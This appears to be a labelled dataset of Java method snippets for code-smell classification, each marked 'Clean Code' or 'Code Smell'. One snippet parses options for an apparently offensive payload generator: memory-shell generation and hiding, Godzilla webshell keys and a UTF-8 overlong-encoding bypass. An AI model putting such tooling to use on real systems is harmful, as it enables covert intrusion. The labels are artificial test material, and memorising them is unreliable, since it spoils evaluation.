text,label,text_label
"@Override public DataResult<Chart> queryExistent(ChartQueryParam param){
  EasyLambdaQueryWrapper<ChartDO> queryWrapper=new EasyLambdaQueryWrapper<>();
  queryWrapper.eq(ChartDO::getDeleted,YesOrNoEnum.NO.getLetter()).eqWhenPresent(ChartDO::getId,param.getId()).eqWhenPresent(ChartDO::getUserId,param.getUserId());
  IPage<ChartDO> page=getMapper().selectPage(new Page<>(1,1),queryWrapper);
  if (CollectionUtils.isEmpty(page.getRecords())) {
    throw new DataNotFoundException();
  }
  Chart data=chartConverter.do2model(page.getRecords().get(0));
  setDataSourceInfo(Lists.newArrayList(data));
  return DataResult.of(data);
}
@Override public DataResult<Chart> queryExistent(Long id){
  DataResult<Chart> dataResult=find(id);
  if (dataResult.getData() == null) {
    throw new DataNotFoundException();
  }
  return dataResult;
}",0,Clean Code
"@Override public CfLogisticsStorehousePlatformCargoTypeExample getExampleByQuery(CfLogisticsStorehousePlatformCargoTypeQuery cfLogisticsStorehousePlatformCargoTypeQuery){
  CfLogisticsStorehousePlatformCargoTypeExample cfLogisticsStorehousePlatformCargoTypeExample=new CfLogisticsStorehousePlatformCargoTypeExample();
  CfLogisticsStorehousePlatformCargoTypeExample.Criteria criteria=cfLogisticsStorehousePlatformCargoTypeExample.createCriteria();
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId() != null) {
    criteria.andLogisticsStorehouseIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId() != null) {
    criteria.andLogisticsStorehousePlatformIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds().size() > 0) {
    criteria.andLogisticsStorehousePlatformIdIn(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId() != null) {
    criteria.andFactoryIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType() != null) {
    criteria.andCargoTypeEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy())) {
    cfLogisticsStorehousePlatformCargoTypeExample.setOrderByClause(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getPage() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsStorehousePlatformCargoTypeQuery.getPage(),cfLogisticsStorehousePlatformCargoTypeQuery.getSize());
  }
  return cfLogisticsStorehousePlatformCargoTypeExample;
}",0,Clean Code
"@Override public void nodeClicked(final CombinedDiffNode node,final MouseEvent event,final double x,final double y){
  if (SwingUtilities.isRightMouseButton(event)) {
    if (node.getRawNode() instanceof RawCombinedFunction) {
      final JPopupMenu menu=new CallGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
 else     if (node.getRawNode() instanceof RawCombinedBasicBlock) {
      final JPopupMenu menu=new FlowGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
    return;
  }
  if (SwingUtilities.isLeftMouseButton(event) && event.getClickCount() == 2 && graph.getGraphType() == EGraphType.CALL_GRAPH) {
    controller.openFlowgraphsViews(node);
  }
}",0,Clean Code
"public void updateTopicData(long dialogId,TLRPC.TL_forumTopic fromTopic,int flags){
  if (fromTopic == null) {
    return;
  }
  storageQueue.postRunnable(() -> {
    SQLitePreparedStatement state=null;
    SQLiteCursor cursor=null;
    try {
      if ((flags & TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) != 0) {
        state=database.executeFast(""UPDATE topics SET total_messages_count = ? WHERE did = ? AND topic_id = ?"");
        state.requery();
        state.bindInteger(1,fromTopic.totalMessagesCount);
        state.bindLong(2,dialogId);
        state.bindInteger(3,fromTopic.id);
        state.step();
        state.dispose();
        if (flags == TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) {
          return;
        }
      }
      TLRPC.TL_forumTopic topicToUpdate=null;
      cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM topics WHERE did = %d AND topic_id = %d"",dialogId,fromTopic.id));
      if (cursor.next()) {
        NativeByteBuffer data=cursor.byteBufferValue(0);
        if (data != null) {
          topicToUpdate=TLRPC.TL_forumTopic.TLdeserialize(data,data.readInt32(true),true);
          data.reuse();
        }
      }
      cursor.dispose();
      cursor=null;
      if (topicToUpdate != null) {
        if ((flags & TopicsController.TOPIC_FLAG_TITLE) != 0) {
          topicToUpdate.title=fromTopic.title;
        }
        if ((flags & TopicsController.TOPIC_FLAG_ICON) != 0) {
          topicToUpdate.icon_emoji_id=fromTopic.icon_emoji_id;
          topicToUpdate.flags|=1;
        }
        if ((flags & TopicsController.TOPIC_FLAG_PIN) != 0) {
          topicToUpdate.pinned=fromTopic.pinned;
          topicToUpdate.pinnedOrder=fromTopic.pinnedOrder;
        }
        int pinnedOrder=topicToUpdate.pinned ? 1 + topicToUpdate.pinnedOrder : 0;
        if ((flags & TopicsController.TOPIC_FLAG_CLOSE) != 0) {
          topicToUpdate.closed=fromTopic.closed;
        }
        if ((flags & TopicsController.TOPIC_FLAG_HIDE) != 0) {
          topicToUpdate.hidden=fromTopic.hidden;
        }
        state=database.executeFast(""UPDATE topics SET data = ?, pinned = ?, hidden = ? WHERE did = ? AND topic_id = ?"");
        database.beginTransaction();
        NativeByteBuffer data=new NativeByteBuffer(topicToUpdate.getObjectSize());
        topicToUpdate.serializeToStream(data);
        state.bindByteBuffer(1,data);
        state.bindInteger(2,pinnedOrder);
        state.bindInteger(3,topicToUpdate.hidden ? 1 : 0);
        state.bindLong(4,dialogId);
        state.bindInteger(5,topicToUpdate.id);
        state.step();
        data.reuse();
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (state != null) {
        state.dispose();
      }
      if (cursor != null) {
        cursor.dispose();
      }
      database.commitTransaction();
    }
  }
);
}",1,Code Smell
"/** 
 * Returns the most restrictive type that is assignable from all given types.
 */
static Type gcd(Type... types){
  if (types.length == 0) {
    return Object.class;
  }
  Type best=types[0];
  Primitive bestPrimitive=Primitive.of(best);
  if (bestPrimitive != null) {
    for (int i=1; i < types.length; i++) {
      final Primitive primitive=Primitive.of(types[i]);
      if (primitive == null) {
        return Object.class;
      }
      if (primitive.assignableFrom(bestPrimitive)) {
        bestPrimitive=primitive;
      }
 else       if (bestPrimitive.assignableFrom(primitive)) {
      }
 else       if (bestPrimitive == Primitive.CHAR || bestPrimitive == Primitive.BYTE) {
        bestPrimitive=Primitive.INT;
        --i;
      }
 else {
        return Object.class;
      }
    }
    return bestPrimitive.primitiveClass;
  }
 else {
    for (int i=1; i < types.length; i++) {
      if (types[i] != types[0]) {
        return Object.class;
      }
    }
  }
  return types[0];
}",1,Code Smell
"/** 
 * FS interface method start 
 */
@Override public void init(Map<String,String> properties) throws IOException {
  if (label == null && (boolean)org.apache.linkis.common.conf.Configuration.IS_MULTIPLE_YARN_CLUSTER()) {
    label=StorageConfiguration.LINKIS_STORAGE_FS_LABEL().getValue();
  }
  conf=HDFSUtils.getConfigurationByLabel(user,label);
  Map<String,String> originProperties=Maps.newHashMap();
  originProperties.put(""fs.oss.endpoint"",StorageConfiguration.OSS_ENDPOINT().getValue());
  originProperties.put(""fs.oss.accessKeyId"",StorageConfiguration.OSS_ACCESS_KEY_ID().getValue());
  originProperties.put(""fs.oss.accessKeySecret"",StorageConfiguration.OSS_ACCESS_KEY_SECRET().getValue());
  for (  String key : originProperties.keySet()) {
    String value=originProperties.get(key);
    if (StringUtils.isNotBlank(value)) {
      conf.set(key,value);
    }
  }
  if (MapUtils.isNotEmpty(properties)) {
    for (    String key : properties.keySet()) {
      String v=properties.get(key);
      if (StringUtils.isNotBlank(v)) {
        conf.set(key,v);
      }
    }
  }
  fs=new AliyunOSSFileSystem();
  try {
    fs.initialize(new URI(StorageUtils.OSS_SCHEMA() + StorageConfiguration.OSS_ACCESS_BUCKET_NAME().getValue()),conf);
  }
 catch (  URISyntaxException e) {
    throw new IOException(""init OSS FileSystem failed!"");
  }
  if (fs == null) {
    throw new IOException(""init OSS FileSystem failed!"");
  }
}
",1,Code Smell
"/** 
 * 投影值分组
 * @param result
 * @param minPixelNum 最小像素累计值
 * @param minSpace    最小间隔数
 * @return
 */
public static List<int[]> groupResult(int[] result,int minPixelNum,int minSpace){
  List<int[]> bwY=new ArrayList<>();
  if (result.length > 0) {
    int targetStart=-1;
    int cal=0;
    for (int i=0; i < result.length; i++) {
      if (targetStart == -1 && result[i] > minPixelNum) {
        targetStart=i;
      }
 else       if (targetStart != -1) {
        if (result[i] <= minPixelNum) {
          if (cal > minSpace) {
            bwY.add(new int[]{targetStart,i - cal});
            targetStart=-1;
            cal=0;
          }
 else {
            cal++;
          }
        }
 else {
          cal=0;
        }
      }
    }
    if (targetStart != -1 && cal <= minSpace) {
      bwY.add(new int[]{targetStart,result.length - 1});
    }
  }
  return bwY;
}",1,Code Smell
"/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
",0,Clean Code
"private void copySoFile(){
  String[] existLibPathArray=new String[3];
  int arrayIndex=0;
  for (  String libPath : APK_LIB_PATH_ARRAY) {
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    if (apkSoFullPathFile.exists()) {
      existLibPathArray[arrayIndex]=libPath;
      arrayIndex++;
    }
  }
  if (arrayIndex == 0) {
    String libPath=APK_LIB_PATH_ARRAY[0];
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    apkSoFullPathFile.mkdirs();
    existLibPathArray[arrayIndex]=libPath;
  }
  for (  String libPath : existLibPathArray) {
    if (libPath != null && !libPath.isEmpty()) {
      String apkSoFullPath=fullLibPath(libPath);
      copyLibFile(apkSoFullPath,mSoFilePathMap.get(libPath));
    }
  }
  if (xposedModuleArray != null && xposedModuleArray.length > 0) {
    int index=0;
    for (    String modulePath : xposedModuleArray) {
      modulePath=modulePath.trim();
      if (modulePath == null || modulePath.length() == 0) {
        continue;
      }
      File moduleFile=new File(modulePath);
      if (!moduleFile.exists()) {
        continue;
      }
      for (      String libPath : existLibPathArray) {
        if (libPath != null && !libPath.isEmpty()) {
          String apkSoFullPath=fullLibPath(libPath);
          String outputModuleName=XPOSED_MODULE_FILE_NAME_PREFIX + index + SO_FILE_SUFFIX;
          File outputModuleSoFile=new File(apkSoFullPath,outputModuleName);
          FileUtils.copyFile(moduleFile,outputModuleSoFile);
        }
      }
      index++;
    }
  }
}",1,Code Smell
"public void onMatch(RelOptRuleCall call){
  final Project topProject=call.rel(0);
  final Project bottomProject=call.rel(1);
  final RelBuilder relBuilder=call.builder();
  final Permutation topPermutation=topProject.getPermutation();
  if (topPermutation != null) {
    if (topPermutation.isIdentity()) {
      return;
    }
    final Permutation bottomPermutation=bottomProject.getPermutation();
    if (bottomPermutation != null) {
      if (bottomPermutation.isIdentity()) {
        return;
      }
      final Permutation product=topPermutation.product(bottomPermutation);
      relBuilder.push(bottomProject.getInput());
      relBuilder.project(relBuilder.fields(product),topProject.getRowType().getFieldNames());
      call.transformTo(relBuilder.build());
      return;
    }
  }
  if (!force) {
    if (RexUtil.isIdentity(topProject.getProjects(),topProject.getInput().getRowType())) {
      return;
    }
  }
  final List<RexNode> newProjects=RelOptUtil.pushPastProject(topProject.getProjects(),bottomProject);
  final RelNode input=bottomProject.getInput();
  if (RexUtil.isIdentity(newProjects,input.getRowType())) {
    if (force || input.getRowType().getFieldNames().equals(topProject.getRowType().getFieldNames())) {
      call.transformTo(input);
      return;
    }
  }
  relBuilder.push(bottomProject.getInput());
  relBuilder.project(newProjects,topProject.getRowType().getFieldNames());
  call.transformTo(relBuilder.build());
}",1,Code Smell
"private void addTaskEdge(List<WorkflowTaskRelation> workflowTaskRelations){
  for (  WorkflowTaskRelation workflowTaskRelation : workflowTaskRelations) {
    long pre=workflowTaskRelation.getPreTaskCode();
    long post=workflowTaskRelation.getPostTaskCode();
    if (pre > 0 && post > 0) {
      if (!taskDefinitionCodeMap.containsKey(pre)) {
        throw new IllegalArgumentException(""Cannot find task: "" + pre);
      }
      if (!taskDefinitionCodeMap.containsKey(post)) {
        throw new IllegalArgumentException(""Cannot find task: "" + post);
      }
      TaskDefinition preTask=checkNotNull(taskDefinitionCodeMap.get(pre),""Cannot find task: "" + pre);
      TaskDefinition postTask=checkNotNull(taskDefinitionCodeMap.get(post),""Cannot find task: "" + pre);
      List<String> predecessorsTasks=predecessors.get(postTask.getName());
      if (predecessorsTasks.contains(preTask.getName())) {
        throw new IllegalArgumentException(""The task relation from "" + preTask.getName() + "" to ""+ postTask.getName()+ "" is already exists"");
      }
      predecessorsTasks.add(preTask.getName());
      List<String> successTasks=successors.get(preTask.getName());
      if (successTasks.contains(postTask.getName())) {
        throw new IllegalArgumentException(""The task relation from "" + preTask.getName() + "" to ""+ postTask.getName()+ "" is already exists"");
      }
      successTasks.add(postTask.getName());
    }
    if (pre <= 0 && post <= 0) {
      throw new IllegalArgumentException(""The task relation from "" + pre + "" to ""+ post+ "" is invalid"");
    }
  }
}",1,Code Smell
"private FileBaseStatistics getFileStats(FileBaseStatistics cachedStats,org.apache.hadoop.fs.Path[] hadoopFilePaths,ArrayList<FileStatus> files) throws IOException {
  long latestModTime=0L;
  for (  org.apache.hadoop.fs.Path hadoopPath : hadoopFilePaths) {
    final Path filePath=new Path(hadoopPath.toUri());
    final FileSystem fs=FileSystem.get(filePath.toUri());
    final FileStatus file=fs.getFileStatus(filePath);
    latestModTime=Math.max(latestModTime,file.getModificationTime());
    if (file.isDir()) {
      FileStatus[] fss=fs.listStatus(filePath);
      files.ensureCapacity(files.size() + fss.length);
      for (      FileStatus s : fss) {
        if (!s.isDir()) {
          files.add(s);
          latestModTime=Math.max(s.getModificationTime(),latestModTime);
        }
      }
    }
 else {
      files.add(file);
    }
  }
  if (cachedStats != null && latestModTime <= cachedStats.getLastModificationTime()) {
    return cachedStats;
  }
  long len=0;
  for (  FileStatus s : files) {
    len+=s.getLen();
  }
  if (len <= 0) {
    len=BaseStatistics.SIZE_UNKNOWN;
  }
  return new FileBaseStatistics(latestModTime,len,BaseStatistics.AVG_RECORD_BYTES_UNKNOWN);
}",1,Code Smell
"public Drawable getThemeDrawable(Context context,int themeDrawableId){
  Drawable drawable=null;
  if (mLastThemeDrawableState != null && mLastThemeDrawableId == themeDrawableId) {
    Drawable.ConstantState drawableState=mLastThemeDrawableState.get();
    if (DEBUG)     Log.v(TAG,""got cached theme drawable state "" + drawableState);
    if (drawableState != null) {
      drawable=drawableState.newDrawable();
    }
  }
  if (drawable == null) {
    drawable=ContextCompat.getDrawable(context,themeDrawableId);
    if (DEBUG)     Log.v(TAG,""loaded theme drawable "" + drawable);
    mLastThemeDrawableState=new WeakReference<Drawable.ConstantState>(drawable.getConstantState());
    mLastThemeDrawableId=themeDrawableId;
  }
  return drawable;
}
private Drawable getThemeDrawable(){
  Drawable drawable=null;
  if (mThemeDrawableResourceId != -1) {
    drawable=mService.getThemeDrawable(mContext,mThemeDrawableResourceId);
  }
  if (drawable == null) {
    drawable=createEmptyDrawable(mContext);
  }
  return drawable;
}",0,Clean Code
"boolean bfs(int courses,int[][] prereq){
  ArrayList[] graph=new ArrayList[courses];
  int count=0;
  int[] degree=new int[courses];
  Queue<Integer> q=new LinkedList<>();
  for (int i=0; i < courses; i++)   graph[i]=new ArrayList();
  for (int i=0; i < prereq.length; i++) {
    graph[prereq[i][0]].add(prereq[i][1]);
    degree[prereq[i][1]]++;
  }
  for (int i=0; i < courses; i++) {
    if (degree[i] == 0) {
      q.add(i);
      count++;
    }
  }
  while (!q.isEmpty()) {
    int course=q.poll();
    for (int i=0; i < graph[course].size(); i++) {
      int pointer=(int)graph[course].get(i);
      degree[pointer]--;
      if (degree[pointer] == 0) {
        q.offer(pointer);
        count++;
      }
    }
  }
  if (count == courses)   return true;
  return false;
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.onnx.protos.ExampleTransformerProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.onnx.protos.ExampleTransformerProto other=(org.tribuo.interop.onnx.protos.ExampleTransformerProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"private void updateVideoPlayerTime(){
  Arrays.fill(videoPlayerCurrentTime,0);
  Arrays.fill(videoPlayerTotalTime,0);
  if (videoPlayer != null) {
    long current=Math.max(0,videoPlayer.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,videoPlayer.getDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
 else   if (photoViewerWebView != null && photoViewerWebView.isControllable()) {
    long current=Math.max(0,photoViewerWebView.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,photoViewerWebView.getVideoDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
  String current, total;
  if (videoPlayerCurrentTime[0] >= 60) {
    current=format(videoPlayerCurrentTime[0] / 60,videoPlayerCurrentTime[0] % 60,videoPlayerCurrentTime[1]);
  }
 else {
    current=format(videoPlayerCurrentTime[0],videoPlayerCurrentTime[1]);
  }
  if (videoPlayerTotalTime[0] >= 60) {
    total=format(videoPlayerTotalTime[0] / 60,videoPlayerTotalTime[0] % 60,videoPlayerTotalTime[1]);
  }
 else {
    total=format(videoPlayerTotalTime[0],videoPlayerTotalTime[1]);
  }
  videoPlayerTime.setText(current + "" / "" + total);
  if (!Objects.equals(lastControlFrameDuration,total)) {
    lastControlFrameDuration=total;
    videoPlayerControlFrameLayout.requestLayout();
  }
}",1,Code Smell
"private List<Cue> getDisplayCues(){
  @Cue.AnchorType int positionAnchor=Cue.ANCHOR_TYPE_END;
  int cueBuilderCount=cueBuilders.size();
  List<Cue> cueBuilderCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilders.get(i).build(Cue.TYPE_UNSET);
    cueBuilderCues.add(cue);
    if (cue != null) {
      positionAnchor=Math.min(positionAnchor,cue.positionAnchor);
    }
  }
  List<Cue> displayCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilderCues.get(i);
    if (cue != null) {
      if (cue.positionAnchor != positionAnchor) {
        cue=cueBuilders.get(i).build(positionAnchor);
      }
      displayCues.add(cue);
    }
  }
  return displayCues;
}",0,Clean Code
"@Override public List<String> getResult(ResultSet rs,String columnName) throws SQLException {
  String value=rs.getString(columnName);
  return getResult(value);
}
@Override public List<String> getResult(ResultSet rs,int columnIndex) throws SQLException {
  String value=rs.getString(columnIndex);
  return getResult(value);
}
@Override public List<String> getResult(CallableStatement cs,int columnIndex) throws SQLException {
  String value=cs.getString(columnIndex);
  return getResult(value);
}
private List<String> getResult(String value){
  if (value == null) {
    return null;
  }
  return StrUtil.splitTrim(value,COMMA);
}
",0,Clean Code
"public static void init(String[] args) throws Exception {
  final Options options=getOptions();
  CommandLineParser parser=new DefaultParser();
  try {
    cmdLine=parser.parse(options,args);
  }
 catch (  Exception e) {
    System.out.println(""[*] Parameter input error, please use -h for more information"");
    System.exit(1);
  }
  if (cmdLine.hasOption(""inherit"")) {
    Config.IS_INHERIT_ABSTRACT_TRANSLET=true;
  }
  if (cmdLine.hasOption(""obscure"")) {
    Config.IS_OBSCURE=true;
  }
  if (cmdLine.hasOption(""cmd-header"")) {
    Config.CMD_HEADER_STRING=cmdLine.getOptionValue(""cmd-header"");
  }
  if (cmdLine.hasOption(""url"")) {
    String url=cmdLine.getOptionValue(""url"");
    if (!url.startsWith(""/"")) {
      url=""/"" + url;
    }
    Config.URL_PATTERN=url;
  }
  if (cmdLine.hasOption(""define-class-from-parameter"")) {
    Config.PARAMETER=cmdLine.getOptionValue(""define-class-from-parameter"");
  }
  if (cmdLine.hasOption(""file"")) {
    Config.WRITE_FILE=true;
    Config.FILE=cmdLine.getOptionValue(""file"");
  }
  if (cmdLine.hasOption(""password"")) {
    Config.PASSWORD_ORI=cmdLine.getOptionValue(""password"");
    Config.PASSWORD=generatePassword(Config.PASSWORD_ORI);
  }
  if (cmdLine.hasOption(""godzilla-key"")) {
    Config.GODZILLA_KEY=generatePassword(cmdLine.getOptionValue(""godzilla-key""));
  }
  if (cmdLine.hasOption(""header-key"")) {
    Config.HEADER_KEY=cmdLine.getOptionValue(""header-key"");
  }
  if (cmdLine.hasOption(""header-value"")) {
    Config.HEADER_VALUE=cmdLine.getOptionValue(""header-value"");
  }
  if (cmdLine.hasOption(""no-com-sun"")) {
    Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL=true;
  }
  if (cmdLine.hasOption(""mozilla-class-loader"")) {
    Config.USING_MOZILLA_DEFININGCLASSLOADER=true;
  }
  if (cmdLine.hasOption(""rhino"")) {
    Config.USING_RHINO=true;
  }
  if (cmdLine.hasOption(""utf8-Overlong-Encoding"")) {
    Config.IS_UTF_Bypass=true;
  }
  if (cmdLine.hasOption(""gen-mem-shell"")) {
    Config.GEN_MEM_SHELL=true;
    if (cmdLine.hasOption(""gen-mem-shell-name"")) {
      Config.GEN_MEM_SHELL_FILENAME=cmdLine.getOptionValue(""gen-mem-shell-name"");
    }
  }
  if (cmdLine.hasOption(""hide-mem-shell"")) {
    Config.HIDE_MEMORY_SHELL=true;
    if (cmdLine.hasOption(""hide-type"")) {
      Config.HIDE_MEMORY_SHELL_TYPE=Integer.parseInt(cmdLine.getOptionValue(""hide-type""));
    }
  }
}",1,Code Smell
"/** 
 * React to a code input. It may be a code point to insert, or a symbolic value that influences the keyboard behavior. <p> Typically, this is called whenever a key is pressed on the software keyboard. This is not the entry point for gesture input; see the onBatchInput* family of functions for this.
 * @param settingsValues the current settings values.
 * @param event the event to handle.
 * @param keyboardShiftMode the current shift mode of the keyboard, as returned by{@link helium314.keyboard.keyboard.KeyboardSwitcher#getKeyboardShiftMode()}
 * @return the complete transaction object
 */
public InputTransaction onCodeInput(final SettingsValues settingsValues,@NonNull final Event event,final int keyboardShiftMode,final String currentKeyboardScript,final LatinIME.UIHandler handler){
  mWordBeingCorrectedByCursor=null;
  mJustRevertedACommit=false;
  final Event processedEvent;
  if (currentKeyboardScript.equals(ScriptUtils.SCRIPT_HANGUL) && (event.getMCodePoint() >= 0x1100 || Character.isWhitespace(event.getMCodePoint()) || event.getMCodePoint() == -1)) {
    mWordComposer.setHangul(true);
    final Event hangulDecodedEvent=HangulEventDecoder.decodeSoftwareKeyEvent(event);
    processedEvent=mWordComposer.processEvent(hangulDecodedEvent);
  }
 else {
    mWordComposer.setHangul(false);
    processedEvent=mWordComposer.processEvent(event);
  }
  final InputTransaction inputTransaction=new InputTransaction(settingsValues,processedEvent,SystemClock.uptimeMillis(),mSpaceState,getActualCapsMode(settingsValues,keyboardShiftMode));
  if (processedEvent.getMKeyCode() != KeyCode.DELETE || inputTransaction.getMTimestamp() > mLastKeyTime + Constants.LONG_PRESS_MILLISECONDS) {
    mDeleteCount=0;
  }
  mLastKeyTime=inputTransaction.getMTimestamp();
  mConnection.beginBatchEdit();
  if (!mWordComposer.isComposingWord()) {
    mIsAutoCorrectionIndicatorOn=false;
  }
  if (processedEvent.getMCodePoint() != Constants.CODE_SPACE) {
    cancelDoubleSpacePeriodCountdown();
  }
  Event currentEvent=processedEvent;
  while (null != currentEvent) {
    if (currentEvent.isConsumed()) {
      handleConsumedEvent(currentEvent,inputTransaction);
    }
 else     if (currentEvent.isFunctionalKeyEvent()) {
      handleFunctionalEvent(currentEvent,inputTransaction,currentKeyboardScript,handler);
    }
 else {
      handleNonFunctionalEvent(currentEvent,inputTransaction,handler);
    }
    currentEvent=currentEvent.getMNextEvent();
  }
  if (!mConnection.hasSlowInputConnection() && !mWordComposer.isComposingWord() && (settingsValues.isWordCodePoint(processedEvent.getMCodePoint()) || processedEvent.getMKeyCode() == KeyCode.DELETE)) {
    mWordBeingCorrectedByCursor=getWordAtCursor(settingsValues,currentKeyboardScript);
  }
  if (!inputTransaction.didAutoCorrect() && processedEvent.getMKeyCode() != KeyCode.SHIFT && processedEvent.getMKeyCode() != KeyCode.CAPS_LOCK && processedEvent.getMKeyCode() != KeyCode.SYMBOL_ALPHA && processedEvent.getMKeyCode() != KeyCode.ALPHA && processedEvent.getMKeyCode() != KeyCode.SYMBOL)   mLastComposedWord.deactivate();
  if (KeyCode.DELETE != processedEvent.getMKeyCode()) {
    mEnteredText=null;
  }
  mConnection.endBatchEdit();
  return inputTransaction;
}",1,Code Smell
"private static FakeExtractorOutput consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  FakeExtractorOutput output=new FakeExtractorOutput();
  extractor.init(output);
  consumeTestData(extractor,input,timeUs,output,retryFromStartIfLive);
  return output;
}
private static void consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,FakeExtractorOutput output,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  extractor.seek(input.getPosition(),timeUs);
  PositionHolder seekPositionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (readResult != Extractor.RESULT_END_OF_INPUT) {
    try {
      seekPositionHolder.position=Long.MIN_VALUE;
      readResult=extractor.read(input,seekPositionHolder);
      if (readResult == Extractor.RESULT_SEEK) {
        long seekPosition=seekPositionHolder.position;
        Assertions.checkState(0 <= seekPosition && seekPosition <= Integer.MAX_VALUE);
        input.setPosition((int)seekPosition);
      }
    }
 catch (    SimulatedIOException e) {
      if (!retryFromStartIfLive) {
        continue;
      }
      boolean isOnDemand=input.getLength() != C.LENGTH_UNSET || (output.seekMap != null && output.seekMap.getDurationUs() != C.TIME_UNSET);
      if (isOnDemand) {
        continue;
      }
      input.setPosition(0);
      for (int i=0; i < output.numberOfTracks; i++) {
        output.trackOutputs.valueAt(i).clear();
      }
      extractor.seek(0,0);
    }
  }
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void deleteStockCheck(List<Long> ids){
  List<ErpStockCheckDO> stockChecks=stockCheckMapper.selectBatchIds(ids);
  if (CollUtil.isEmpty(stockChecks)) {
    return;
  }
  stockChecks.forEach(stockCheck -> {
    if (ErpAuditStatus.APPROVE.getStatus().equals(stockCheck.getStatus())) {
      throw exception(STOCK_CHECK_DELETE_FAIL_APPROVE,stockCheck.getNo());
    }
  }
);
  stockChecks.forEach(stockCheck -> {
    stockCheckMapper.deleteById(stockCheck.getId());
    stockCheckItemMapper.deleteByCheckId(stockCheck.getId());
  }
);
}
",0,Clean Code
"public void openSearchWithText(String text){
  boolean delay=false;
  if (savedMessagesHint != null && savedMessagesHint.shown()) {
    savedMessagesHint.hide();
    delay=true;
  }
  if (savedMessagesSearchHint != null && savedMessagesSearchHint.shown()) {
    savedMessagesSearchHint.hide();
    delay=true;
  }
  if (delay) {
    AndroidUtilities.runOnUIThread(() -> openSearchWithText(text),200);
    return;
  }
  if (!actionBar.isSearchFieldVisible()) {
    AndroidUtilities.updateViewVisibilityAnimated(avatarContainer,false,0.95f,true);
    if (headerItem != null) {
      headerItem.setVisibility(View.GONE);
    }
    if (attachItem != null) {
      attachItem.setVisibility(View.GONE);
    }
    if (editTextItem != null) {
      editTextItem.setVisibility(View.GONE);
    }
    if ((threadMessageId == 0 || chatMode == MODE_SAVED) && searchItem != null) {
      searchItem.setVisibility(View.VISIBLE);
    }
    if (searchIconItem != null && showSearchAsIcon) {
      searchIconItem.setVisibility(View.GONE);
    }
    if (audioCallIconItem != null && showAudioCallAsIcon) {
